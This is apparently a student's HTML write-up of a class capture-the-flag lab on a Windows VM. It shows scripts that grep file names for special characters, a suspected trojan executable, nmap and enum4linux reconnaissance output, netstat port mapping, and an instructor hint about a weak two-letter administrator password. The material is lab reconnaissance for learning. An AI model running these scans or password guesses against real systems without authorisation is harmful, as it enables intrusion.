+    <blockquote> Oh, yeah! PS!<br>
+      I have had many questions about how to initially break into the CTF. Hint:
+      The Administrator2 password is only two, lowercase letters. Might check
+      out: (110) 2022-05-06 Bonus Class Recording - YouTube There may be a good
+      reason I reworked and then meticulously went over this lab. (Just
+      sayin&rsquo;😊)<br>
+      Hope this helps!<br>
+      Also, look for file names that clearly do not belong to the
+      OS.&nbsp;&nbsp; &lt;&lt;&lt;&lt;&lt;&lt;&lt; Which I construe to mean that
+      they have special characters<br>
+      Lastly, fear not the honeypots. They will not hurt you. Leave no file
+      unexplored! <br>
+      <br>
+      Happy hunting!<br>
+      <br>
+      Ben<br>
+    </blockquote>
+    <p> </p>
+    <pre>effs@jeffs-desktop:~/Coding_DoJo/Final$ fgrep \! file_names.txt
+./inetpub/wwwroot/proposed_website_staging_docs/Oops!.png
+./Users/Admin/AppData/Roaming/Microsoft/Windows/Recent/Yeah!.lnk
+./Users/Admin/AppData/Roaming/Microsoft/Windows/Recent/Yes! You found it!.lnk
+./Users/Administrator2/AppData/Roaming/Microsoft/Windows/Recent/Don't look here! .url
+./Users/Administrator2/AppData/Roaming/Microsoft/Windows/Recent/Get Lost!.url
+./Users/Administrator2/AppData/Roaming/Microsoft/Windows/Recent/It's not here!.lnk
+./Users/Administrator2/AppData/Roaming/Microsoft/Windows/Recent/Oops!.lnk
+./Users/Administrator2/Desktop/Get lost!.url
+./Users/Administrator2/Desktop/It's not here!.png
+./Users/Guest-Account/Desktop/Don't look here! .url
+./Users/User/AppData/Roaming/Microsoft/Windows/Recent/Almost There!.lnk
+./Users/User/Desktop/Almost There!.txt
+jeffs@jeffs-desktop:~/Coding_DoJo/Final$ 
+</pre>
+    <p>Let's automate this with a script.</p>
+    <p><br>
+    </p>
+    <pre><code class="code">
+#! /bin/bash
+#
+# This script looks for filename with special characters
+# The file file_names.txt  is something I made with the system rescue CD, it's
+# find /mnt/windows/* &gt; file_names.txt
+#
+date
+# Destroy the log file
+echo "" &gt; special_character_filenames.tmp<br>#<br># Loop over the special characters<br>for c in \~ \` \@ \# \$ \% \^ \&amp; \* \( \) \_ \- \+ \= \{ \} \[ \] \: \; \" \' ; do
+  echo "$c"
+  fgrep "$c" file_names.txt | tee -a special_character_filenames.tmp
+done
+
+sort special_character_filenames.tmp &gt; q.tmp
+wc -l q.tmp
+uniq q.tmp special_character_filenames.txt
+wc -l special_character_filenames.txt
+echo "Look at special_character_filenames.txt"
+date
+
+    
+    
+    </code></pre>
+    <pre>jeffs@jeffs-desktop:~/Coding_DoJo/Final$ <kbd>bash special_character_search.sh</kbd>
+...<br>687375 q.tmp
+334374 special_character_filenames.txt
+Look at special_character_filenames.txt
+Fri 13 May 2022 12:52:19 PM PDT
+jeffs@jeffs-desktop:~/Coding_DoJo/Final$ wc -l file_names.txt 
+393994 file_names.txt
+</pre>
+    <p>For the next iteration, take out $ and - and _ as special
+      characters.&nbsp; Also, for each special character, count how many files
+      that&nbsp; special character counted.&nbsp; Also, filter out .exe, .dll,
+      .jpg, .jpeg, .png and .gif files.&nbsp; This is easy to do, use
+      new_files_not_DLLs_or_EXEs_not_Avast_not_PNGS.txt instead of new</p>
+    <pre><code class="code">#! /bin/bash
+#
+# This script looks for filename with special characters
+# The file file_names.txt  is something I made with the system rescue CD, it's
+# find /mnt/windows/* &gt; file_names.txt
+#
+date
+# Destroy the log file
+echo "" &gt; special_character_filenames.tmp<br>egrep -E -v -i "dll|exe|avast|png|jpg|jpeg|mp3|mp4" file_names.txt &gt; file_names_filtered.txt
+<br>
+# Loop over the special characters
+for c in \~ \` \@ \# \% \^ \&amp; \* \( \) \+ \= \{ \} \[ \] \: \; \" \' ; do
+  echo "$c"
+  fgrep "$c" file_names.txt | tee -a special_character_filenames.tmp
+done
+
+sort special_character_filenames.tmp &gt; q.tmp
+wc -l q.tmp
+uniq q.tmp special_character_filenames.txt
+wc -l special_character_filenames.txt
+echo "Look at special_character_filenames.txt"
+date
+</code></pre>
+    <table style="width: 100%" border="1">
+      <tbody>
+        <tr>
+          <td>
+            <p>I neglected to use the output of the filtering routine as the
+              input to the loop over the special characters routine</p>
+          </td>
+          <td>After fixing so that the filtered outputs were used the special
+            characters files.</td>
+        </tr>
+        <tr>
+          <td>
+            <pre>       0 special_character_filenames_".tmp
+    4632 special_character_filenames_#.tmp
+     167 special_character_filenames_%.tmp
+       3 special_character_filenames_&amp;.tmp
+      20 special_character_filenames_'.tmp
+   62084 special_character_filenames_(.tmp
+   62084 special_character_filenames_).tmp
+       0 special_character_filenames_*.tmp
+     768 special_character_filenames_+.tmp
+       <b>0</b> special_character_filenames_:.tmp
+       8 special_character_filenames_;.tmp
+    2209 special_character_filenames_=.tmp
+    4823 special_character_filenames_@.tmp
+     323 special_character_filenames_[.tmp
+     323 special_character_filenames_].tmp
+       0 special_character_filenames_^.tmp
+       0 special_character_filenames_`.tmp
+    3264 special_character_filenames_{.tmp
+    3264 special_character_filenames_}.tmp
+   76127 special_character_filenames_~.tmp
+  220099 total
+</pre></td>
+          <td>
+            <pre>       jeffs@jeffs-desktop:~/Coding_DoJo/Final$ ./special_character_search.sh 
+Fri 13 May 2022 10:02:24 PM PDT
+Verify that all_files_filtered.txt is less than all_files.txt
+   290193 all_files_filtered.txt
+   <b>454595</b> all_files_size_month_name.txt
+   <b>454595</b> all_files.txt
+  1199383 total
+./special_character_search.sh: line 15: q: command not found
+      0 special_character_filenames_".tmp
+   1488 special_character_filenames_#.tmp
+    319 special_character_filenames_%.tmp
+      4 special_character_filenames_&amp;.tmp
+      4 special_character_filenames_'.tmp
+      0 special_character_filenames_(.tmp
+      0 special_character_filenames_).tmp
+      0 special_character_filenames_*.tmp
+     15 special_character_filenames_+.tmp
+      0 special_character_filenames_:.tmp
+      4 special_character_filenames_;.tmp
+   1794 special_character_filenames_=.tmp
+      8 special_character_filenames_@.tmp
+    247 special_character_filenames_[.tmp
+    247 special_character_filenames_].tmp
+      0 special_character_filenames_^.tmp
+      0 special_character_filenames_`.tmp
+   3503 special_character_filenames_{.tmp
+   3503 special_character_filenames_}.tmp
+  11136 total
+11136 q.tmp
+<b>7377</b> special_character_filenames.txt
+Look at special_character_filenames.txt
+Fri 13 May 2022 10:02:25 PM PDT
+jeffs@jeffs-desktop:~/Coding_DoJo/Final$ 
+
+</pre></td>
+        </tr>
+      </tbody>
+    </table>
+    <pre>
+</pre>
+    <p><br>
+    </p>
+    <h5><a id="mozTocId711722" class="mozTocH5"></a>I think I found a Trojan</h5>
+    <p>Look at:</p>
+    <pre>   298008       4 drwxrwxrwx   1 root     root           4096 May  5 17:53 /mnt/windows/<font
+color="#EF2929"><b>Program\ Files</b></font>\ (x86)/Xiao\ Stenography
+   298075      64 -rwxrwxrwx   1 root     root          64356 May  5 17:53 /mnt/windows/<font
+color="#EF2929"><b>Program\ Files</b></font>\ (x86)/Xiao\ Stenography/uninst.exe
+   298072       1 -rwxrwxrwx   2 root     root             49 May  5 17:53 /mnt/windows/<font
+color="#EF2929"><b>Program\ Files</b></font>\ (x86)/Xiao\ Stenography/Xiao\ Stenography.url
+   298065     340 -rwxrwxrwx   2 root     root         348160 Jun 25  2006 /mnt/windows/<font
+color="#EF2929"><b>Program\ Files</b></font>\ (x86)/Xiao\ Stenography/Xiao_Steg.exe
+</pre>
+    <p></p>
+    <p><br>
+    </p>
+    <p>Refer to&nbsp; <a href="https://hybrid-analysis.com/sample/c9b71e0d8e7834e3ea002bef2f171adc7f2af3efa7e5f706ce7122d770136ffc?environmentId=100&amp;lang=ja">Xiao_Steg.exe</a><span
+        class="pull-right small"><span class="text-muted">&nbsp;&nbsp; Labeled
+          as:</span> <a href="https://hybrid-analysis.com/search?query=vxfamily%3A%22Trojan.Malware.300983%22"
+          target="_blank">Trojan.Malware.300983</a></span> <span id="share-buttons-separator"
+        class="pull-right"> </span> <span id="share-buttons" class="pull-right">
+      </span><span id="share-buttons" class="pull-right"> </span><span id="share-buttons"
+        class="pull-right"> </span></p>
+    <div class="page-header">
+      <p class="text-muted small">This report is generated from a file or URL
+        submitted to this webservice on February 26th 2020 19:12:35 (UTC)<br>
+        <span id="guest-system"></span></p>
+    </div>
+    <p><br>
+    </p>
+    <p></p>
+    <h5><a id="mozTocId910113" class="mozTocH5"></a>Exploring the VM from the
+      network side.</h5>
+    <pre><br><br><font color="#4E9A06">┌──(</font><font color="#729FCF"><b>kali㉿kali</b></font><font
+color="#4E9A06">)-[</font><font color="#000000"><b>~</b></font><font color="#4E9A06">]</font>
+<font color="#4E9A06">└─</font><font color="#729FCF"><b>$</b></font> <font color="#4E9A06">nmap</font> <font
+color="#37063F">-sT</font> <font color="#37063F">-A</font> <font color="#37063F">-p-</font> 192.168.0.35 <font
+color="#37063F">-T</font> 4
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-13 02:59 EDT<br>Nmap scan report for WinDev2204Eval (192.168.0.35)
+Host is up (0.00048s latency).
+Not shown: 65519 closed tcp ports (conn-refused)
+PORT      STATE SERVICE            VERSION
+22/tcp    open  ssh                OpenSSH for_Windows_8.1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 ef:bd:1c:e5:0f:c0:65:6f:e6:56:4c:18:11:27:00:5a (RSA)
+|   256 58:3e:69:53:09:dc:70:ee:23:c5:79:32:46:a8:e3:7e (ECDSA)
+|_  256 b0:1b:2d:26:02:06:d5:2d:d3:7a:c6:02:8a:c6:f3:4d (ED25519)
+80/tcp    open  http               Microsoft IIS httpd 10.0
+|_http-title: You found something but I'm looking for a number not a picture...
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+3389/tcp  open  ssl/ms-wbt-server?
+|_ssl-date: 2022-05-13T07:03:10+00:00; 0s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: WINDEV2204EVAL
+|   NetBIOS_Domain_Name: WINDEV2204EVAL
+|   NetBIOS_Computer_Name: WINDEV2204EVAL
+|   DNS_Domain_Name: WinDev2204Eval
+|   DNS_Computer_Name: WinDev2204Eval
+|   Product_Version: 10.0.22000
+|_  System_Time: 2022-05-13T07:02:55+00:00
+| ssl-cert: Subject: commonName=WinDev2204Eval
+| Not valid before: 2022-04-10T15:38:56
+|_Not valid after:  2022-10-10T15:38:56
+5040/tcp  open  unknown
+7680/tcp  open  pando-pub?
+49664/tcp open  msrpc              Microsoft Windows RPC
+49665/tcp open  msrpc              Microsoft Windows RPC
+49666/tcp open  msrpc              Microsoft Windows RPC
+49667/tcp open  msrpc              Microsoft Windows RPC
+49668/tcp open  msrpc              Microsoft Windows RPC
+49671/tcp open  msrpc              Microsoft Windows RPC
+49672/tcp open  msrpc              Microsoft Windows RPC
+49673/tcp open  msrpc              Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_nbstat: NetBIOS name: WINDEV2204EVAL, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:6f:3e:e5 (Oracle VirtualBox virtual NIC)
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2022-05-13T07:02:55
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 223.00 seconds
+                                                                                                                                                                            
+<font color="#4E9A06">┌──(</font><font color="#729FCF"><b>kali㉿kali</b></font><font
+color="#4E9A06">)-[</font><font color="#000000"><b>~</b></font><font color="#4E9A06">]</font>
+<font color="#4E9A06">└─</font><font color="#729FCF"><b>$</b></font> 
+
+&nbsp;</pre>
+    <h5><a id="mozTocId258846" class="mozTocH5"></a>Exploring the VM from the
+      inside - running under windows/11</h5>
+    <p><br>
+    </p>
+    <h6><a id="mozTocId586068" class="mozTocH6"></a>What's listening on which
+      ports?</h6>
+    <pre>administrator2@WINDEV2204EVAL c:\inetpub\wwwroot&gt;netstat -aon
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID
+  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       2624
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       924
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       404	Remote Desktop Protocol
+  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       5016  svchost.exe
+  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       336	 <a href="https://community.spiceworks.com/topic/2090731-wudo-blowing-up-tcp-port-7680-on-syslog-server">Windows Update Delivery Optimization (WUDO)</a>. 
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       692
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       544
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1196
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1584
+  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2052
+  TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING       3164
+  TCP    0.0.0.0:49672          0.0.0.0:0              LISTENING       636
+  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       2320
+  TCP    127.0.0.1:5040         127.0.0.1:50229        ESTABLISHED     5016
+  TCP    127.0.0.1:5040         127.0.0.1:50230        ESTABLISHED     5016
+  TCP    127.0.0.1:50229        127.0.0.1:5040         ESTABLISHED     2436
+  TCP    127.0.0.1:50230        127.0.0.1:5040         ESTABLISHED     2436
+  TCP    192.168.0.35:22        192.168.0.149:60782    ESTABLISHED     2624
+  TCP    192.168.0.35:139       0.0.0.0:0              LISTENING       4
+  TCP    192.168.0.35:5040      192.168.0.14:48076     CLOSE_WAIT      5016  (192.168.0.14 is kali)
+  TCP    192.168.0.35:5040      192.168.0.14:48078     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48080     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48082     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48084     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48086     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48088     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48090     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48092     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48094     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48096     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48098     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48100     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48102     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48104     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48106     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48108     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48110     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48112     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48114     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48116     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48118     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48120     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48122     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48124     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48126     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48130     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48132     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48134     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48136     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48138     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48140     CLOSE_WAIT      5016
+  TCP    192.168.0.35:5040      192.168.0.14:48142     CLOSE_WAIT      5016
+  TCP    192.168.0.35:49737     40.83.247.108:443      ESTABLISHED     2648
+  TCP    192.168.0.35:50156     138.91.254.96:443      CLOSE_WAIT      2436
+  TCP    192.168.0.35:50181     199.232.144.157:443    ESTABLISHED     2436
+  TCP    192.168.0.35:50241     72.21.91.29:80         CLOSE_WAIT      5144
+  TCP    [::]:22                [::]:0                 LISTENING       2624
+  TCP    [::]:80                [::]:0                 LISTENING       4
+  TCP    [::]:135               [::]:0                 LISTENING       924
+  TCP    [::]:445               [::]:0                 LISTENING       4
+  TCP    [::]:3389              [::]:0                 LISTENING       404
+  TCP    [::]:7680              [::]:0                 LISTENING       336
+  TCP    [::]:49664             [::]:0                 LISTENING       692           <a
+href="#lsass-explanation">lsass.exe Local Security Authority Subsystem Service</a>
+  TCP    [::]:49665             [::]:0                 LISTENING       544
+  TCP    [::]:49666             [::]:0                 LISTENING       1196	<a href="#svchost.exe-PID=1195">svchost.exe</a>
+  TCP    [::]:49667             [::]:0                 LISTENING       1584
+  UDP    192.168.0.35:138       *:*                                    4
+  UDP    192.168.0.35:138       *:*                                    4
+  UDP    192.168.0.35:138       *:*                                    4
+  UDP    192.168.0.35:1900      *:*                                    2520	<a href="../SNORT_report_Jeff_Silverman.html">MISC UPnP malformed advertisement</a>    
+  UDP    192.168.0.35:64128     *:*                                    2520	
+  UDP    [::]:123               *:*                                    2820	Network Time Protocol (NTP)
+  UDP    [::]:500               *:*                                    2328
+  UDP    [::]:3389              *:*                                    404
+  UDP    [::]:4500              *:*                                    2328
+  UDP    [::]:5353              *:*                                    5724
+  UDP    [::]:5353              *:*                                    1784
+  UDP    [::]:5355              *:*                                    1784
+  UDP    [::]:49275             *:*                                    1784
+  UDP    [::]:50649             *:*                                    1784
+  UDP    [::]:52937             *:*                                    1784
+  UDP    [::]:54138             *:*                                    1784
+  UDP    [::]:54239             *:*                                    1784
+  UDP    [::]:58492             *:*                                    1784
+  UDP    [::]:58655             *:*                                    1784
+  UDP    [::]:58742             *:*                                    1784
+  UDP    [::1]:1900             *:*                                    2520
+  UDP    [::1]:64127            *:*                                    2520
+  UDP    [fe80::b843:858c:e82a:dfb7%8]:1900  *:*                       2520
+  UDP    [fe80::b843:858c:e82a:dfb7%8]:64126  *:*                      2520
+
+administrator2@WINDEV2204EVAL c:\inetpub\wwwroot&gt;
+</pre>
+    <p>&nbsp;&nbsp; <a href="https://tecadmin.net/which-process-is-listening-on-a-port-in-windows/">Which
+        Process is listening on a Port in Windows ?</a>&nbsp;&nbsp;&nbsp; </p>
+    <p><br>
+    </p>
+    <p>netstat -aon | findstr ":5040" | findstr "LISTENING"</p>
+    <pre><meta http-equiv="content-type" content="text/html; charset=utf-8"><pre>tasklist /fi "pid eq 5016"
+<br><br>administrator2@WINDEV2204EVAL c:\inetpub\wwwroot&gt;<kbd>netstat -aon | findstr ":5040" | findstr "LISTENING"</kbd>
+<samp>  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       5016
+</samp>
+administrator2@WINDEV2204EVAL c:\inetpub\wwwroot&gt;
+administrator2@WINDEV2204EVAL c:\inetpub\wwwroot&gt;<kbd>tasklist /fi "pid eq 5016"</kbd>
+<samp>
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+svchost.exe                   5016 Services                   0     16,632 K
+
+administrator2@WINDEV2204EVAL c:\inetpub\wwwroot&gt;</samp>
+administrator2@WINDEV2204EVAL c:\inetpub\wwwroot&gt;<kbd> Get-Process -Id (Get-NetTCPConnection -LocalPort 5040).OwningProcess</kbd>
+<span style="color: red;">'Get-Process' is not recognized as an internal or external command,
+operable program or batch file.
+</span>
+administrator2@WINDEV2204EVAL c:\inetpub\wwwroot&gt;
+
+<br>administrator2@WINDEV2204EVAL c:\inetpub\wwwroot&gt;<kbd>netstat -aon | findstr ":80" | findstr "LISTENING"</kbd>   
+<samp>  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
+  TCP    [::]:80                [::]:0                 LISTENING       4
+</samp>
+administrator2@WINDEV2204EVAL <kbd>c:\inetpub\wwwroot&gt;tasklist /fi "pid eq 4"   </kbd> 
+
+<samp>Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+System                           4 Services                   0        136 K
+</samp>
+administrator2@WINDEV2204EVAL c:\inetpub\wwwroot&gt;</pre></pre>
+    <p><a name="lsass_explanation" id="lsass_explanation"></a><a name="lsass-explanation"
+        id="lsass-explanation"></a>Why is anything listening at a port number as
+      high as 49664?&nbsp; According to <a href="https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service">Wikipedia</a>,
+      it is the Local Security Authority Service</p>
+    <pre><pre><br>administrator2@WINDEV2204EVAL c:\inetpub\wwwroot&gt;netstat -aon | findstr ":49664" | findstr "LISTENING"
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       692
+  TCP    [::]:49664             [::]:0                 LISTENING       692
+
+administrator2@WINDEV2204EVAL c:\inetpub\wwwroot&gt;c:\inetpub\wwwroot&gt;tasklist /fi "pid eq 4"  
+'c:\inetpub\wwwroot' is not recognized as an internal or external command,
+operable program or batch file.
+
+administrator2@WINDEV2204EVAL c:\inetpub\wwwroot&gt;tasklist /fi "pid eq 692"                    
+
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+lsass.exe                      692 Services                   0     20,496 K
+
+administrator2@WINDEV2204EVAL c:\inetpub\wwwroot&gt;
+
+administrator2@WINDEV2204EVAL c:\inetpub\wwwroot&gt;netstat -aon | findstr ":49665" | findstr "LISTENING" 
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       544
+  TCP    [::]:49665             [::]:0                 LISTENING       544
+
+administrator2@WINDEV2204EVAL c:\inetpub\wwwroot&gt;tasklist /fi "pid eq 544"
+
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+wininit.exe                    544 Services                   0      6,324 K
+
+<a name="svchost.exe-PID=1195" id="svchost.exe-PID=1195"></a>administrator2@WINDEV2204EVAL c:\inetpub\wwwroot&gt;netstat -aon | findstr ":49666" | findstr "LISTENING" 
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1196
+  TCP    [::]:49666             [::]:0                 LISTENING       1196
+
+administrator2@WINDEV2204EVAL c:\inetpub\wwwroot&gt;tasklist /fi "pid eq 1196"
+
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+svchost.exe                   1196 Services                   0     51,824 K
+
+administrator2@WINDEV2204EVAL c:\inetpub\wwwroot&gt;netstat -aon | findstr ":49667" | findstr "LISTENING" 
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1584
+  TCP    [::]:49667             [::]:0                 LISTENING       1584
+
+administrator2@WINDEV2204EVAL c:\inetpub\wwwroot&gt;tasklist /fi "pid eq 1584" 
+
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+svchost.exe                   1584 Services                   0     15,648 K
+
+administrator2@WINDEV2204EVAL c:\inetpub\wwwroot&gt;netstat -aon | findstr ":49668" | findstr "LISTENING" 
+  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2052
+  TCP    [::]:49668             [::]:0                 LISTENING       2052
+
+administrator2@WINDEV2204EVAL c:\inetpub\wwwroot&gt;tasklist /fi "pid eq 2052" 
+
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+spoolsv.exe                   2052 Services                   0     20,288 K
+
+administrator2@WINDEV2204EVAL c:\inetpub\wwwroot&gt;netstat -aon | findstr ":49669" | findstr "LISTENING" 
+
+administrator2@WINDEV2204EVAL c:\inetpub\wwwroot&gt;
+
+&nbsp;</pre></pre>
+    <h6><a id="mozTocId653521" class="mozTocH6"></a>SMB?</h6>
+    <pre><font color="#4E9A06">┌──(</font><font color="#729FCF"><b>kali㉿kali</b></font><font
+color="#4E9A06">)-[</font><font color="#EAFB05"><b>~</b></font><font color="#4E9A06">]</font>
+<font color="#4E9A06">└─</font><font color="#729FCF"><b>$</b></font> <font color="#4E9A06">enum4linux</font> <font
+color="#75507B">-v</font> 192.168.0.35
+
+<font color="#C4A000">[V] </font><font color="#75507B">Dependent program "nmblookup" found in /usr/bin/nmblookup</font>
+
+
+<font color="#C4A000">[V] </font><font color="#75507B">Dependent program "net" found in /usr/bin/net</font>
+
+
+<font color="#C4A000">[V] </font><font color="#75507B">Dependent program "rpcclient" found in /usr/bin/rpcclient</font>
+
+
+<font color="#C4A000">[V] </font><font color="#75507B">Dependent program "smbclient" found in /usr/bin/smbclient</font>
+
+
+<font color="#C4A000">[V] </font><font color="#75507B">Dependent program "polenum" found in /usr/bin/polenum</font>
+
+
+<font color="#C4A000">[V] </font><font color="#75507B">Dependent program "ldapsearch" found in /usr/bin/ldapsearch</font>
+
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri May 13 04:25:44 2022
+
+<font color="#3465A4"> =========================================( </font><font color="#4E9A06">Target Information</font><font
+color="#3465A4"> )=========================================</font>
+
+Target ........... 192.168.0.35
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+<font color="#3465A4"> ============================( </font><font color="#4E9A06">Enumerating Workgroup/Domain on 192.168.0.35</font><font
+color="#3465A4"> )============================</font>
+
+
+<font color="#C4A000">[V] </font><font color="#75507B">Attempting to get domain name with command: nmblookup -A '192.168.0.35'</font>
+
+
+<font color="#C4A000">[+] </font><font color="#4E9A06">Got domain/workgroup name: WORKGROUP</font>
+
+
+<font color="#3465A4"> ================================( </font><font color="#4E9A06">Nbtstat Information for 192.168.0.35</font><font
+color="#3465A4"> )================================</font>
+
+Looking up status of 192.168.0.35
+	WINDEV2204EVAL  &lt;00&gt; -         M &lt;ACTIVE&gt;  Workstation Service
+	WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; M &lt;ACTIVE&gt;  Domain/Workgroup Name
+	WINDEV2204EVAL  &lt;20&gt; -         M &lt;ACTIVE&gt;  File Server Service
+
+	MAC Address = 08-00-27-6F-3E-E5
+
+<font color="#3465A4"> ===================================( </font><font color="#4E9A06">Session Check on 192.168.0.35</font><font
+color="#3465A4"> )===================================</font>
+
+
+<font color="#C4A000">[V] </font><font color="#75507B">Attempting to make null session using command: smbclient -W 'WORKGROUP' //'192.168.0.35'/ipc$ -U''%'' -c 'help' 2&gt;&amp;1</font>
+
+
+<font color="#C4A000">[E] </font><font color="#CC0000">Server doesn't allow session using username '', password ''.  Aborting remainder of tests.</font>
+
+                                                                                                                                                 
+<font color="#4E9A06">┌──(</font><font color="#729FCF"><b>kali㉿kali</b></font><font
+color="#4E9A06">)-[</font><font color="#EAFB05"><b>~</b></font><font color="#4E9A06">]</font>
+<font color="#4E9A06">└─</font><font color="#729FCF"><b>$</b></font> 
+
+</pre>
+    <p><br>
+    </p>
+    <h6><a id="mozTocId909290" class="mozTocH6"></a>I installed avast anti virus
+      software</h6>
+    <p>I did a smart scan, and found nothing.</p>
+    <p><br>
+    </p>
+    <p></p>
+    <p> </p>
+    <h4><a id="mozTocId509384" class="mozTocH4"></a>I win a red belt at least!</h4>
+    <p>This is from <span style="font-family: monospace;">C:/Users/User/Desktop/Almost
+        There!.txt</span> :</p>
+    <blockquote>
+      <pre>A7XGRKZTdHCt0lSaYKJsgkWf6HjaPO7U3Dsxa91gUxgnPYWlWoZJX6ZFY88+zox4hZZTzKkGpek7gC/s9BMIEw==
+        
+        Hint: https://online-toolz.com/tools/text-encryption-decryption.php</pre>
+    </blockquote>
+    <p><br>
+    </p>
+    <p><br>
+    </p>
+    <img src="Final/The_user_level_flag.png" alt="" title="The User Level Flag">
+    <p><br>
+    </p>
+    <p><br>
+    </p>
+    <h2><a id="mozTocId627062" class="mozTocH2"></a>Critique of the Capture the
+      Flag</h2>
+    <p>The VM is too big.&nbsp; What could be removed with no loss of difficulty</p>
+    <ul>
+      <li>pycharm</li>
+      <li>Microsoft Visual Studio Code</li>
+      <li><br>
+      </li>
+    </ul>
+    <span style="font-family: Courier New,Courier,monospace;">[root@sysrescue
+      /mnt/windows]# du -s -BM Program\ Files/JetBrains/<br>
+      1465M&nbsp;&nbsp;&nbsp; Program Files/JetBrains/<br>
+      [root@sysrescue /mnt/windows]# du -s -BM Program\ Files/Microsoft\ <br>
+      Microsoft
+      SDKs/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+      Microsoft SQL
+      Server/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Microsoft
+      Update Health Tools/ Microsoft Visual
+      Studio/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
+      [root@sysrescue /mnt/windows]# du -s -BM Program\ Files/Microsoft\ Visual\
+      Studio/<br>
+      5754M&nbsp;&nbsp;&nbsp; Program Files/Microsoft Visual Studio/<br>
